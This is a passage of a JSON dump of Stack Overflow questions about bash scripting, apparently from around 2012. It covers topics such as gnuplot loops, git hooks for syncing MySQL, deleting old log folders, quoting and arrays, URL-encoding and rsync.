print</p>\n\n<pre><code>value4\nvalue5\nvalue6\n</code></pre>\n\n<p>Is this possible? The only way I can see is to write a small function to break out the values manually, is there built in support in bash for this?</p>\n"},{"tags":["bash","script","background","centos"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":81,"score":0,"question_id":12575504,"title":"CentOS start php script in background","body":"<p>I am trying to start program in background from command line:</p>\n\n<pre><code>[root@my]# php file.php&amp;\n[1] 16897\n[root@my]# bg\n[1]+  Stopped file.php\n</code></pre>\n\n<p>It always stopped doesn't matter which php to start, where the problem is?</p>\n"},{"tags":["bash","wget"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":64,"score":1,"question_id":12574832,"title":"How to split a line and assign variables in Bash","body":"<p>How do you: </p>\n\n<ul>\n<li>read from a text file </li>\n<li>split each line with a comma </li>\n<li>and assign it to variables in bash? </li>\n</ul>\n\n<p>&nbsp;</p>\n\n<p><strong>filelist</strong></p>\n\n<p>renamedfile.xml,url-01.php <br />\nrenamedFileDifferent.xml,url-02.php <br />\nspecificFileRename.xml,\"url-03\"<br />\nnewFilename.xml,\"url-04\"<br />\n&nbsp;</p>\n\n<p>I'm looking to accomplish something like this:</p>\n\n<pre><code>    #!/usr/bin/env bash \n    while read line \n      do   \n          wget -c -O newfile remoteFile &gt;/dev/null 2&gt;&amp;1  \n    done &lt; filelist \n</code></pre>\n\n<p>&nbsp;</p>\n\n<p>Also, what is a typical place to place shell files for cron jobs?</p>\n"},{"tags":["osx","bash","gnuplot","gawk"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":102,"score":1,"question_id":12573690,"title":"Calling Gnuplot from GAWK and Bash scripts, plots only first plot","body":"<p>Ok, so here's the deal. I am starting my undergrad thesis in computational materials science and I am trying to put some scripts together to help prepare for data analysis.</p>\n\n<p>I have been preparing a GAWK script that will basically take some data (arranged in 4 columns) and snag two of them and plot them in GNUPLOT. To achieve this end, I read in the data file which has multiple timesteps and their associated data in it, split the file into individual .dat files for each timestep.</p>\n\n<p>From there I just generate a basic input script for GNUPLOT and plot each timestep as they occur in the data file.</p>\n\n<p>The issue is that for some reason all of the plots generated are exactly the same plot (in this case always the first time step) but they are saved as the correct timestep.</p>\n\n<p>I have already gone through and tracked each variable/filename throughout the script and finally determined that the issue is somehow with GNUPLOT being called from a script. I took out my system command and wrote a short bash script that calls gnuplot from a for loop:</p>\n\n<pre><code>#!/bin/bash\nfor file in ./*gnu\ndo\n   gnuplot $file\ndone\n</code></pre>\n\n<p>And that still causes the same issue where all of the plots are the same. I then just ran the command gnuplot *gnu from the command line in the directory containing the .gnu files and it worked. </p>\n\n<p>I guess I am just wondering if there is some buffer that I need to be flushing or if I am just missing something? </p>\n\n<p>The GAWK script is given below. I am new to this still, so if you wish to comment on the script with some constructive criticism I would greatly appreciate that as well.</p>\n\n<pre><code>#!/opt/local/bin/gawk -v inputf=$1 -f                                                   \n\n# Write gnuplot files and plot RDF data                                                 \nfunction plot_rdf(timestep, Load_RDF_dat)\n{\n# Set number of digits in filenames to 6 so data is organized                           \n    if (timestep &lt; 10){\n        pad_timestep=\"00000\"timestep;\n    }\n    else if (timestep &lt; 100){\n        pad_timestep=\"0000\"timestep;\n    }\n    else if (timestep &lt; 1000){\n        pad_timestep=\"000\"timestep;\n    }\n    else if (timestep &lt; 10000){\n        pad_timestep=\"00\"timestep;\n    }\n    else if (timestep &lt; 100000){\n        pad_timestep=\"0\"timestep;\n    }\n    else{\n        pad_timestep=timestep;\n    }\n\n# Give output filenames                                                                 \n       gnu_file=\"plot_RDF_\"pad_timestep\".gnu\";\n       png_file=\"RDF_\"pad_timestep\".png\";\n\n# Create input files for gnuplot                                                        \n       print \"set output \\\"\"png_file\"\\\"\" &gt;&gt; gnu_file;\n       print \"set terminal png\" &gt;&gt; gnu_file;\n       print \"plot './\"Load_RDF_dat\"' u 1:2\" &gt;&gt; gnu_file;\n       close(gnu_file);\n       system(\"gnuplot \"gnu_file);\n}\n\n\n# Main part of script                                                                   \n{\n# Parse the RDF data and save it to GNUPLOT readable files                              \n    while(getline &lt; inputf){\n       if ($1 == \"#\"){\n           # skips the three commented header lines                                     \n           next;\n       }\n       else if (NF == 2){\n           timestep=$1;\n           bin_num=$2;\n           print \"Reading timestep \"timestep;\n           RDF_dat=\"RDF_\"timestep\".dat\";\n           next;\n       }\n       else if (NF == 4){\n           print $2\" \"$3 &gt;&gt; RDF_dat;\n           if ($1 == bin_num){\n               plot_rdf(timestep, RDF_dat);\n               close(RDF_dat);\n           }\n           next;\n       }\n    }\n    close(inputf);\n    close(RDF_dat);\n }\n</code></pre>\n\n<p>A snippet of the data file I'm reading in is:</p>\n\n<pre><code># Time-averaged data for fix rdf\n# TimeStep Number-of-rows\n# Row c_allrdf[1] c_allrdf[2] c_allrdf[3]\n500 100\n1 0.005 0 0\n2 0.015 0 0\n3 0.025 0 0\n4 0.035 0 0\n5 0.045 0 0\n6 0.055 1.16597 0.00133333\n7 0.065 2.08865 0.00466667\n8 0.075 1.56958 0.008\n9 0.085 0.733433 0.01\n10 0.095 0.587288 0.012\n600 100\n1 0.005 0 0\n2 0.015 0 0\n3 0.025 2.79219 0.000666667\n4 0.035 2.86766 0.002\n5 0.045 0 0.002\n6 0.055 0.582985 0.00266667\n7 0.065 2.08865 0.006\n8 0.075 0.62783 0.00733333\n9 0.085 0.488955 0.00866667\n10 0.095 1.17458 0.0126667\n</code></pre>\n\n<p>There is usually 100 sets of data in each timestep section, but I figured I'd shorten here just so you'd get the idea.</p>\n"},{"tags":["linux","bash","shell"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":147,"score":0,"question_id":12552463,"title":"Delete files & folders recursively","body":"<p>I have so much files and folders. They have a syntax like this path </p>\n\n<p>/opt/logs/qnap/[hosta,hostb]/2012/03/12</p>\n\n<h2>All log file on the Qnap data storage and it is in the another location. So when I want to delete files &amp; folders which are older than 180 days I cannot use find command cause of the slowness. So I wrote a script like this .</h2>\n\n<pre><code>SixMonthAgo=$(date --date='190 day ago' \"+%Y/%m/%d/%H\")  = 2011/06/12/12\nHosts=\"hosta hostb\"\nmaxDay=181\nqnapFolder=\"/opt/logs/qnap\"\n\nfor host in $(echo \"${Hosts}\"); do\n        maxDayAgo=$(date --date=\"${maxDay} day ago\" \"+%Y/%m/%d\")\n        countCharacters=$(echo ${maxDayAgo} | wc -c)\n        if [ ${countCharacters} -ge 10 ]; then\n                rm -rf ${qnapFolder}/${host}/${maxDayAgo} #output of this just like 2012/03/12\n        fi\ndone\n</code></pre>\n\n<hr>\n\n<p>But sometimes i got an error. This soluiton is not working correctly what I want. I want to delete all files and folders before 180 days. How can I do this ?  That must delete before all files and directories before 2012/03/23 for example .</p>\n\n<p>Thanks in advance </p>\n"},{"tags":["git","bash","sync","mysqldump","githooks"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":59,"score":1,"question_id":12573883,"title":"Howto sync database with git and git hooks and howto debug if it doesn't work","body":"<p>On OS: Ubuntu 12.04  </p>\n\n<p>I've got a drupal deployment (live website) and a staging environment (test website) on my server. Each time I pull changes from my staging website I want to synchronize the database automatically, as instructed here: <a href=\"http://ben.kulbertis.org/2011/10/synchronizing-a-mysql-database-with-git-and-git-hooks/\" rel=\"nofollow\">http://ben.kulbertis.org/2011/10/synchronizing-a-mysql-database-with-git-and-git-hooks/</a></p>\n\n<p>The setup I use is exactly the same (with settings and paths according to my setup of course). </p>\n\n<p><strong>Quote from the website:</strong></p>\n\n<blockquote>\n  <p>Let’s start with pre-commit. The pre-commit hook will run a script directly before a commit is executed. To edit your pre-commit hook:</p>\n\n<pre><code>[your editor] /path/to/your/repo/.git/hooks/pre-commit\n</code></pre>\n  \n  <p>Now, lets write the pre-commit script. We are going to tell the system to dump our MySQL database to our git repository and add it to be committed.</p>\n\n<pre><code>#!/bin/sh\nmysqldump -u [mysql user] -p[mysql password] --skip-extended-insert [database] &gt; /path/to&gt; /your/repo/[database].sql\ncd /path/to/your/repo\ngit add [database].sql\n</code></pre>\n  \n  <p>Now, lets write the post-merge script. We are going to tell the system to restore the MySQL dump to the local database for the latest changes. Edit the post-merge hook with:</p>\n\n<pre><code>[your editor] /path/to/your/repo/.git/hooks/post-merge\n</code></pre>\n  \n  <p>And write:</p>\n\n<pre><code>#!/bin/sh\nmysql -u [mysql user] -p[mysql password] [database] &lt; /path/to/your/repo/[database].sql\n</code></pre>\n</blockquote>\n\n<p>But when I do a commit and then a pull, nothing seems to happen. The post-merge and pre-commit hooks reside in my hooks dir of the deployment repository from which I conduct the commit and pull. Both have execution rights: <code>chmod +x /path/to/hook</code></p>\n\n<p>I have tested the commands I have placed in the hooks. They should work correctly.</p>\n\n<p>Any way to debug what's wrong?</p>\n"},{"tags":["bash","script","input","timer","user"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":54,"score":3,"question_id":12557436,"title":"Timer that only runs during user input","body":"<p>Running Arch Linux</p>\n\n<p>I have a script running that takes a screenshot every fifteen minutes, resizes it, and puts it in my dropbox folder.  This is kind of a pain when I leave my computer alone for a period of time and end up with multiple screenshots of the same thing.</p>\n\n<p>What I'd like to do is take a screenshot after every fifteen minutes of USE, instead of every fifteen minutes.  I'd like to define USE as within 30 seconds of a keypress - if I sit and type for fifteen minutes, that counts.  If I just check on things once an hour all day, it only counts the time I'm actually typing.</p>\n\n<p>How can I do this?  I'm open to any solution in any language, using any existing program, etc, as long as it works as described above (or close).</p>\n"},{"tags":["java","linux","bash","jar"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":66,"score":0,"question_id":12570737,"title":"Having a jar file in your $PATH ? Good idea?","body":"<p>I have put a .jar in my path so I can execute it anywhere, but if I run it like a command I think bash thinks it's a script. </p>\n\n<p>Should I just make a bash script that has 'java -jar ' and have that script in my path instead? </p>\n"},{"tags":["bash","shell","jvm","quotes"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":108,"score":0,"question_id":12532051,"title":"-XX:OnOutOfMemoryError=\"<cmd> <arg>\" gives Error : Could not find or load main class <arg>","body":"<p>I have set JAVA_OPTS as</p>\n\n<pre><code>export JAVA_OPTS=\"$JAVA_OPTS -server -XX:+PrintGCDetails -XX:+PrintGCTimeStamps -Xloggc:gc.log  -Dcom.sun.management.jmxremote.ssl=false -Xms100m -Xmx100m -XX:MaxPermSize=5M -XX:ReservedCodeCacheSize=100m -Xss100k -XX:NewRatio=2 -XX:+UseParallelOldGC -XX:+UseParallelGC -XX:CompileThreshold=100  -XX:HeapDumpPath=/usr/share/$package -XX:-HeapDumpOnOutOfMemoryError -XX:OnError=$TEMP_CMD -XX:OnOutOfMemoryError=$TEMP_CMD\"\n</code></pre>\n\n<p>then am running the command \"trinidad -p \"</p>\n\n<p>In $TEMP_CMD, if I use command without any argument then OutOfMemoryError occurs and the $TMP_CMD command also runs. But if I use any argument with a command then the following output is shown</p>\n\n<pre><code>Error: Could not find or load main class &lt;arg&gt;\n</code></pre>\n\n<p>arg is the argument</p>\n\n<p>Can anyone give me the solution?</p>\n\n<p>Are there any changes to be made in trinidad.yml or any other cofig file?</p>\n"},{"tags":["regex","bash"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":12569123,"title":"regular expression extract string after a colon in bash","body":"<p>I need to extract the string after the <code>:</code> in an example below:</p>\n\n<p><code>package:project.abc.def</code></p>\n\n<p>Where i would get <code>project.abc.def</code> as a result.</p>\n\n<p>I am attempting this in bash and i believe i have a regular expression that will work <code>:([^:]*)$</code>.</p>\n\n<p>In my bash script i have <code>package:project.abc.def</code> as a variable called <code>apk</code>. Now how do i assign the same variable the substring found with the regular expression?</p>\n\n<p>Where the result from <code>package:project.abc.def</code> would be in the <code>apk</code> variable. And <code>package:project.abc.def</code> is initially in the <code>apk</code> variable?</p>\n\n<p>Thanks!</p>\n"},{"tags":["osx","bash","dialog","osascript"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":68,"score":1,"question_id":12569839,"title":"Why does a bash script continue running even though a dialog box is displayed on the screen waiting for an input from the user?","body":"<p>I have a bash script I'm using on Mac OS X (X.5 thru X.8) machines. In it is a dialog situation asking to continue the script by pressing \"OK\" or letting the script snooze by pressing \"snooze\". That part is working. </p>\n\n<p>However, I was testing the script and wasn't able to press either button immediately and after a minute or two (i didn't time it), the script continued with the rest of process, letting the dialog stay on the screen. </p>\n\n<p>I was under the impression that the script had to wait for user input?</p>\n\n<p>Part of the script in question:</p>\n\n<p>osascript -e 'tell app \"Finder\" to activate'</p>\n\n<p>return=<code>osascript -e 'tell app \"Finder\" to display dialog \"Text goes here. Please select OK or Snooze\" buttons {\"OK\", \"Snooze\"} default button 1 with title \"Text Here\" with icon caution'</code></p>\n\n<pre><code>    ############  BEGIN LOOP HERE  ##############\n</code></pre>\n\n<p>while [ \"$return\" == \"button returned:Snooze\" ]</p>\n\n<pre><code>        do\n        Runs every 4 hours\n        sleep 14400\n        osascript -e 'tell app \"Finder\" to activate'\n        return=`osascript -e 'tell app \"Finder\" to display dialog \"Text goes here. Please select OK or Snooze\" buttons {\"OK\", \"Snooze\"} default button 1 with title \"Text Here\" with icon 2'`\n</code></pre>\n\n<p>done</p>\n\n######  END LOOP HERE\n\n<pre><code>    if [ \"$return\" == \"button returned:OK\" ]\n        then\n                    run the installer script here\n            fi\n</code></pre>\n"},{"tags":["android","bash","adb"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12570150,"title":"Using adb in bash is giving different results than expected","body":"<p>I have a bash script for uninstalling some software that is loaded onto our devices.</p>\n\n<pre><code>#!/bin/bash\nAPKS=`adb shell pm list packages projects`\n\nfor apk in $APKS\ndo\n    apk=${apk##package:}\n    echo \"Uninstalling: $apk\"\n    adb uninstall $apk\ndone\n</code></pre>\n\n<p>When i run this script, all of the commands to uninstall an apk fail. However, when i run the exact same command (<code>adb uninstall projects.abd.def</code>) outside of the bash script, it executes successfully.</p>\n\n<p>What am i doing wrong in the bash script?</p>\n"},{"tags":["bash","shell","directory"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":96,"score":0,"question_id":11908517,"title":"Simulating the find command: why is my code not recursing correctly?","body":"<p>My assignment is to write a Unix shell script that asks the user for the name of a directory, and then works exactly like <code>find</code>.</p>\n\n<p>Here is what I have so far:</p>\n\n<pre><code>#!/bin/bash\ndir_lister()\n{\n    cd \"$1\"\n    echo \"$1\"\n    list=$(ls -l ${1})\n\n\n    nolines=$(echo \"$list\" | awk 'END{printf \"%d\",NF}')\n\n    if [ $nolines -eq 2 ]\n    then\n\n        echo \"$1\"\n\n        return\n    fi\n\n    filelist=$(echo \"$list\" | grep ^-.*)\n    dirlist=$(echo \"$list\" | grep ^d.*)\n\n    filename=$(echo \"$filelist\"| awk '{printf \"%s\\n\",$NF}')\n    present=$(pwd)\n    echo \"$filename\"| awk -v pres=$present '{printf \"%s/%s\\n\",pres,$0}'\n\n    dirlist2=$(echo \"$dirlist\" | awk '{printf \"%s\\n\",$NF}')\n\n    echo \"$dirlist2\" | while IFS= read -r line;\n    do\n        nextCall=$(echo \"$present/$line\");\n        dir_lister $nextCall;\n        cd \"..\"\n    done\n    cd \"..\"\n}\n\n\n\nread -p \"Enter the name of the direcotry: \" dName\n\ndir_lister $dName \n</code></pre>\n\n<p>The problem is, after a depth of three directories, this script gets into an infinite loop, and I don't see why.</p>\n\n<p>EDIT:</p>\n\n<p>Here is the code i came up with after looking at your answer, it still doesn't go more than 1 directory depth:</p>\n\n<pre><code>#!/bin/bash\n\nshopt -s dotglob # don't miss \"hidden files\"\nshopt -s nullglob # don't fail on empty directories\n\n\nlist_directory()\n{\n    cd \"$2\"\n    cd \"$1\"\n    ##echo -e \"I am called \\t $1 \\t $2\"\n    for fileName in \"$1/\"* \n    do\n        ##echo -e \"hello \\t $fileName\"\n        if [ -d \"$fileName\" ];\n        then\n            echo \"$fileName\"\n            list_directory $fileName $2\n\n        else\n            echo \"$fileName\"\n        fi\n    done\n\n}\nread -p \"Enter the direcotory Name: \" dirName\nvar=$(pwd)\nlist_directory $dirName $var\n</code></pre>\n"},{"tags":["bash","shell","unix","append","string-concatenation"],"answer_count":7,"favorite_count":12,"up_vote_count":72,"down_vote_count":0,"view_count":72572,"score":72,"question_id":4181703,"title":"How can I concatenate string variables in Bash?","body":"<p>In PHP I would add strings together like this:</p>\n\n<pre><code>$foo = \"Hello\";\n$foo .= \" World\";\n</code></pre>\n\n<p>So <code>$foo</code> would be \"Hello World\"</p>\n\n<p>How would I do that in Bash?</p>\n"},{"tags":["linux","bash"],"answer_count":0,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":12565658,"title":"Get actual CPU speed when using dynamic CPU scaling","body":"<p>I need a way to get the actual CPU(hardware) speed(maxspeed) when using dynamic CPU freq. scaling. Reading /proc/cpuinfo does not work as it shows the current step in scaling. Also the min-max frequencies in CPU scaling are configurable so reading \" /sys/devices/system/cpu/cpu0/cpufreq/scaling_max_freq\" will not do it, I need a reliable way.</p>\n\n<p>Example : \n  My model shows \"Intel(R) <strong>**</strong> CPU 3.66GHz\" but the min-max of freq scaling can be configured(say 500MHZ to 2.3GHZ). How can I get the 3.66GHZ value ?</p>\n"},{"tags":["bash","scripting","urlencode"],"answer_count":16,"favorite_count":13,"up_vote_count":37,"down_vote_count":0,"view_count":30946,"score":37,"question_id":296536,"title":"URLEncode from a bash script","body":"<p>I am trying to write a bash script for testing that takes a parameter and sends it through curl to web site.  I need to url encode the value to make sure that special characters are processed properly.  What is the best way to do this?  </p>\n\n<p>Here is my basic script so far:</p>\n\n<pre><code>#!/bin/bash\nhost=${1:?'bad host'}\nvalue=$2\nshift\nshift\ncurl -v -d \"param=${value}\" http://${host}/somepath $@\n</code></pre>\n"},{"tags":["bash","echo","double-quotes","quotation-marks"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":33,"score":2,"question_id":12567215,"title":"how to show single quote in single-quoted text","body":"<p>I have a <code>bash</code> script,</p>\n\n<pre><code>echo 'abcd'\n</code></pre>\n\n<p>in shell, I want to show <code>ab'c'd</code> and I have tried following approach but without success</p>\n\n<pre><code>echo 'ab\\'c\\'d'\n</code></pre>\n\n<p>I am asking is it possible to show single quote in single quoted text?</p>\n"},{"tags":["arrays","bash","unix","scripting"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":610,"score":3,"question_id":9084257,"title":"BASH array with spaces in elements","body":"<p>I'm trying to construct an Array in bash-shell of the filenames from my camera:</p>\n\n<pre><code>FILES=(2011-09-04 21.43.02.jpg\n2011-09-05 10.23.14.jpg\n2011-09-09 12.31.16.jpg\n2011-09-11 08.43.12.jpg)\n</code></pre>\n\n<p>As you can see, there is a space in the middle of each filename.<br>\nI've tried wrapping each name in quotes, and escaping the space with a backslash, neither of which works.<p></p>\n\n<p>When I try to access the array elements, it continues to treat the space as the element-delimiter.</p>\n\n<p>How can I properly capture the filenames with a space inside the name?</p>\n"},{"tags":["bash","shell","path"],"answer_count":6,"favorite_count":0,"up_vote_count":12,"down_vote_count":0,"view_count":5239,"score":12,"question_id":3915040,"title":"bash/fish command to print absolute path to a file","body":"<p>Question: is there a simple sh/bash/zsh/fish/... command to print the absolute path of whichever file I feed it?</p>\n\n<p>Usage case: I'm in directory <code>/a/b</code> and I'd like to print the full path to file <code>c</code> on the command-line so that I can easily paste it into another program: <code>/a/b/c</code>. Simple, yet a little program to do this could probably save me 5 or so seconds when it comes to handling long paths, which in the end adds up. So it surprises me that I can't find a standard utility to do this — is there really none?</p>\n\n<p>Here's a sample implementation, abspath.py:</p>\n\n<pre><code>#!/usr/bin/python\n# Author: Diggory Hardy &lt;diggory.hardy@gmail.com&gt;\n# Licence: public domain\n# Purpose: print the absolute path of all input paths\n\nimport sys\nimport os.path\nif len(sys.argv)&gt;1:\n    for i in range(1,len(sys.argv)):\n        print os.path.abspath( sys.argv[i] )\n    sys.exit(0)\nelse:\n    print &gt;&gt; sys.stderr, \"Usage: \",sys.argv[0],\" PATH.\"\n    sys.exit(1)\n</code></pre>\n"},{"tags":["bash","function","colors","echo"],"answer_count":3,"favorite_count":3,"up_vote_count":4,"down_vote_count":0,"view_count":853,"score":4,"question_id":6592077,"title":"bash prompt and echoing colors inside a function","body":"<p>I have this in my .bashrc:</p>\n\n<pre><code>LIGHTGREEN=\"\\[\\033[1;32m\\]\"\nLIGHTRED=\"\\[\\033[1;31m\\]\"\nWHITE=\"\\[\\033[0;37m\\]\"\nRESET=\"\\[\\033[0;00m\\]\"\n\nfunction error_test {\n    if [[ $? = \"0\" ]]; then\n        echo -e \"$LIGHTGREEN\"\n    else\n        echo -e \"$LIGHTRED\"\n    fi\n}\n\nPS1=\"\\u\\$(error_test)@\\w$RESET \\$ \"\n</code></pre>\n\n<p>This seems to make the shell output exactly:</p>\n\n<p><code>username\\[\\]@~/</code></p>\n\n<p>The escaping [ and ] around the color codes are showing up in my prompt. If I remove the escape codes from around the colors it works, but then bash line wrapping fails stupendously. </p>\n\n<p>Note if do <code>PS1=\"LIGHTGREEN - whatever - $RESET\"</code> it works and the [ and ] are not escaped. However, I want to do this inside a function, which seems to be the issue.</p>\n\n<p>I can't find any good documentation on this. <code>man echo</code> doesn't even list a -e option. Bash seems like it has a lot of undocumented, handmedown knowledge.</p>\n"},{"tags":["bash","script","timer","sleep","polling"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12357447,"title":"looking for alternative to polling once per sec in a bash script","body":"<p>This code is untested, the aim is to check the size of the output file every 3 secs and kill myprogram if it stops increasing. It should also be killed after 60 secs regardless.</p>\n\n<p>This script will be run multiple times triggered by the events of an overall script.</p>\n\n<p>My question is, id there a more efficient way to achieve the monitoring of the file sizes with out running dozens of 1 sec timers.</p>\n\n<p>Perhaps a script running a master 1 sec timer who's output is piped into all of the file size monitoring scripts as and when they're run? </p>\n\n<pre><code>myprogram &gt;&gt; ~/log/$$.txt\npid=!$\nfilesize='1'\ncounter='0'\ncounter2='0'\nwhile ((counter&lt;61))\n do\n ((counter++))\n ((counter2++))\n  if (( $counter2 == \"3\" )) ;\n  then\n  counter2='0'\n  lastfilesize=$filesize\n  filesize=$(stat -c%s \"~/log/$$.txt\")\n   if (( $filesize == $lastfilesize )) ;\n   then \n   kill $pid\n   fi\n  fi\n sleep 1\ndone\n if (( $counter == 61 )) ;\n then\n kill $pid\n fi\nexit\n</code></pre>\n"},{"tags":["bash","scrolling","cygwin","ps1"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":82,"score":1,"question_id":10857474,"title":"Scroll problems with empty PS1","body":"<p>I am using Cygwin Bash.</p>\n\n<p>If I scroll up through the history and come across a long line that wraps, then scroll back down, the lines will be scrambled.</p>\n\n<p>I have read around that this can be caused by incorrectly escaping color codes, but this happens even with an empty PS1, e.g.</p>\n\n<pre><code>export PS1=\"\";\n</code></pre>\n\n<h1>Edit</h1>\n\n<p>In response to comment</p>\n\n<pre><code>echo \"[$PROMPT_COMMAND]\"\n[]\necho \"[$PS1]\"\n[]\necho \"[$TERM]\"\n[cygwin]\n</code></pre>\n"},{"tags":["git","bash","git-filter-branch"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":56,"score":2,"question_id":12564592,"title":"git-filter-branch with --index-filter : strange bash error ( ! : event not found)","body":"<p>I am using the answer to <a href=\"http://stackoverflow.com/questions/2982055/detach-many-subdirectories-into-a-new-separate-git-repository\">this question</a> to strip a clone of a repository to a list of files I want to keep in a spin off of this project. Say I want to strip all but directory <code>src/main</code> and its sub-directories. Because I will have multiple files and directories, I use <code>--index-filter</code> instead of <code>--subdirectory-filter</code>.</p>\n\n<p>I thought the following should work:</p>\n\n<pre><code>git filter-branch --index-filter \"git rm -r -f --cached --ignore-unmatch ↩\n  src/!(main)\" --prune-empty -- --all\n</code></pre>\n\n<p>But all I get is</p>\n\n<pre><code>-bash: !: event not found\n</code></pre>\n\n<p>I tried all sorts of different paths instead of <code>src/!(main)</code>. I always get exactly that error message. It seems to be a bash problem, because that line also doesn't enter my command line history?</p>\n\n<hr>\n\n<p>That is to say, if I have top level files <code>A</code>, and <code>B</code>, and subdirectory <code>C/D</code>, how can I remove <strong>all but</strong> these three things?</p>\n"},{"tags":["linux","bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":12563946,"title":"I'm copying all httpdocs files from server to server using rsync, what do I use to include hidden / htaccess files","body":"<p>Here is the command I'm running </p>\n\n<pre><code>rsync -av -e ssh httpdocs user@ipaddress:httpdocs \n</code></pre>\n\n<p>but that misses out hidden files like .htaccess ?</p>\n\n<p>Any help appreciated !</p>\n\n<p>Rich :)</p>\n"},{"tags":["php","mysql","bash","shell","webserver"],"answer_count":4,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":76,"score":1,"question_id":12560544,"title":"How to get information about the client that requests page from Server?","body":"<p>I need to get information about the client that requests a page from the server. I need to get information about client IP and which page is request? I would prefer a console application i.e. Shell or Bash script in linux[Ubuntu]. If the page is requested there would be instant print message to the console or terminal. In that message it should be included the IP address and page requested. I also wanted to save the IP address and the requested page into the database through MySQL. I'd appreciate your answer and solution. </p>\n\n<p>Thanks</p>\n"},{"tags":["bash","parameter-passing","double-quotes","variable-expansion"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":33,"score":2,"question_id":12564337,"title":"How to keep strings quoted in bash parameters","body":"<p>I have a Bash script which passes patterns and switches to grep.</p>\n\n<pre><code>#!/bin/bash\n\nfoo() {\n    grep $@ *.txt\n}\n\nfoo $@\n</code></pre>\n\n<p>And, of course, <code>myscript SomeText</code> works but <code>myscript \"Text1 Text2\"</code> does not. Is there a way to keep the quotes when passing arguments from script to foo() and then from foo() to grep?</p>\n\n<p>Note, that I cannot simply use eval and wrap the whole $@ before grep since it can also contain switches so I need to keep the original quoting as passed from the command line.</p>\n\n<p>Thanks.</p>\n"},{"tags":["bash","paste","cat"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12564454,"title":"Difference between Concatenation and Append","body":"<p>What is the basic and essential difference between Concatenate and Append</p>\n"},{"tags":["bash","shell"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":39,"score":1,"question_id":12562163,"title":"Bash - Have I put the quotations in the right place?","body":"<p>I'm a bit confused about stripping out the filename of a URL using bash in a fucntion. This is what I have written, but I'm new to this, and cant figure out if I have done it right.</p>\n\n<pre><code>function file_download()\n{\n    filename={$1##*/}\n    tar xzf $filename\n\n}\n\nfile_download \"http://www.url.com/test.zip\"\n</code></pre>\n\n<p>Should I be putting quotations around the \"$1\"?</p>\n"},{"tags":["git","bash"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":238,"score":2,"question_id":10722650,"title":"Export specific Git commits as patches","body":"<p>I am trying to export several commits (those that contain a specific ticket number 1234 in the commit message) to patch files.</p>\n\n<p><em>EDIT</em> The working script is on <a href=\"https://github.com/amenk/SelfScripts/blob/master/git-extract-patches\" rel=\"nofollow\">https://github.com/amenk/SelfScripts/blob/master/git-extract-patches</a></p>\n\n<p>This is what I have </p>\n\n<pre><code>#!/bin/bash -x\ncommits=`git log --pretty=oneline | grep \"#1234\" | cut -f1 -d\" \"`\nno=1;\nfor COMMIT in $commits\ndo\n    git format-patch -1 $COMMIT --start-number=$no\n    no=$(($no+1))\ndone\n</code></pre>\n\n<p>But for some reason executing of git format-patch fails:</p>\n\n<pre><code>$ ./getpatches.sh \n++ git log --pretty=oneline\n++ grep '#6809'\n++ cut -f1 '-d '\n+ commits='da591d66f05513488ee06857edc9d24a046c179d\n4fd781da9cc503b961f8e4c42bbb136d9e3c1806\n3a9311f5507f91f830b44673c57f672e7aabaac0'\n+ no=1\n+ for COMMIT in '$commits'\n+ git format-patch -1 'da591d66f05513488ee06857edc9d24a046c179d' --start-number=1\nfatal: ambiguous argument 'da591d66f05513488ee06857edc9d24a046c179d': unknown revision or path not in the working tree.\nUse '--' to separate paths from revisions\n</code></pre>\n\n<p>When I call <code>git format-patch -1 'da591d66f05513488ee06857edc9d24a046c179d' --start-number=1</code> manually, everything is fine.</p>\n\n<p><em>EDIT:</em></p>\n\n<p>I think it is something with the quotes. If I add a <code>git log | grep $COMMIT</code> into the loop, I get the following error:</p>\n\n<pre><code>+ grep '992ab41d3539539bd609209beed33a9de2f4277a'\ngrep: Unmatched [ or [^\n</code></pre>\n\n<p>Another interseting effect is, if I hard-code <code>grep '992ab41d3539539bd609209beed33a9de2f4277a'</code> in the for loop, the command output (because of the <code>-x</code> option for <code>bash</code> is without the quotes and it works.</p>\n\n<pre><code> + grep 992ab41d3539539bd609209beed33a9de2f4277a\n</code></pre>\n\n<p>Where are these quotes coming from and how do I get rid of them?</p>\n"},{"tags":["bash","sed","awk"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":63,"score":2,"question_id":12526157,"title":"Rename the extension of huge number of files Bash","body":"<p>I want to change extension of large number of files,</p>\n\n<p>Example: <strong>\"ABC.dat.length.doc.fasta\"</strong></p>\n\n<p>Desired: 